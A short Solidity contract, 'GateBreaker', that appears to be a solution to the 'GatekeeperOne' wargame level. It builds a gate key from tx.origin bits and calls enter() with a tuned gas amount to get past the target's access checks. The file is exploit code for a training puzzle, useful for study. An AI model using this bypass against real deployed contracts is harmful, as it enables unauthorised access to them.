// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface GatekeeperOne {
  function enter(bytes8 _gateKey) external returns (bool);
}

contract GateBreaker {
    GatekeeperOne internal immutable gatekeeper;

    constructor(GatekeeperOne gatekeeper_) {
        gatekeeper = gatekeeper_;
    }

    function enter(uint gasStipend) public {
        bytes8 key = bytes8(uint64(uint16(uint160(tx.origin))) | (1 << 32));
        gatekeeper.enter{gas: gasStipend}(key);
    }
}
